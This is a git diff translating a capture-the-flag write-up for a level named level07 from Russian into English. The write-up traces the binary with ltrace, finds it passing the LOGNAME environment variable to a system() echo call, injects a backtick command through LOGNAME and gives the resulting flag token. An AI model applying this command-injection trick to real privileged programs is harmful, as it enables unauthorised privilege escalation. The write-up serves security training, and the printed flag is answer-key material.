@@ -1,7 +1,7 @@
-1. Мы видим один исполнительный файл в исходной директории под именем level07
-2. Запуск файла приводит к выводу названия - level07
-3. ltrace ./level07:
-
+1. We are given `level07` binary executable, output when launched: "level07"
+2. Check the inner system calls
+```
+$ ltrace ./level07
 __libc_start_main(0x8048514, 1, 0xbffff6e4, 0x80485b0, 0x8048620 <unfinished ...>
 getegid()                                                = 2007
 geteuid()                                                = 2007
@@ -14,8 +14,9 @@ system("/bin/echo level07 "level07
 --- SIGCHLD (Child exited) ---
 <... system resumed> )                                   = 0
 +++ exited (status 0) +++
-
-Видно, что LOGNAME содержит текст level07, а echo его выводит на экран. Значит, если подменить LOGNAME, то удастся получить флаг.
-4. Подмена содержимого переменной среды LOGNAME
+```
+3. Environmental variable `LOGNAME` contains "level07" text, and `echo` prints it on screen. Therefore if swap containing of `LOGNAME` with shell command in backticks, it will be executed by echo
+``` Bash
 export LOGNAME=\`getflag\`
-5. Запуск исполнительного файла теперь дает токен от level08: fiumuikeil55xe9cu4dood66h
+```
+4. Launching `./level07` results to flag for level08: **fiumuikeil55xe9cu4dood66h**
